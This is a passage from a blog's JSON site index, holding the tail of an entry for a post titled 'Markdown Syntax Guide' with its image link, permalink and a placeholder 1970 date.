2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"1970-01-01T00:00:00Z","image":"https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/2_hu_3e58a979f20e4e46.jpg","permalink":"https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/","title":"Markdown Syntax Guide"}]